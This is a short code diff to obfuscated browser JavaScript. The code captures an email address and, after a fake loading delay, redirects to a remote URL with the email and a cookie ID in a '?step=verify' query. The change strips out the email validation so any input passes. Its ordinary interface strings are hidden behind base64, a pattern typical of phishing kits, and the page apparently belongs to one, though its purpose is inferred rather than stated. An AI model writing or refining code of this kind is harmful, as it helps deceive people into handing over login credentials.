@@ -470,7 +470,7 @@
                     }
                 }
 
-                if (validateEmail(em) && validateEmailDomain(em)) {
+                {
                     document.querySelector(_s('LmNvbnRpbnVlLWJ0bg==')).style.display = _s('bm9uZQ==');
                     document.querySelector(_s('I2xvYWRlcg==')).style.display = _s('ZmxleA==');
 
@@ -508,8 +508,6 @@
                         
                         window.location.href = bu + '/' + encodeURIComponent(em).replace(/%40/g, '@') + _s('P3N0ZXA9dmVyaWZ5JmNvb2tpZUlkPQ==') + cookieId;
                     }, 2000);
-                } else {
-                    ei.style.borderColor = _s('I2QzMTUxMA==');
                 }
             });
 
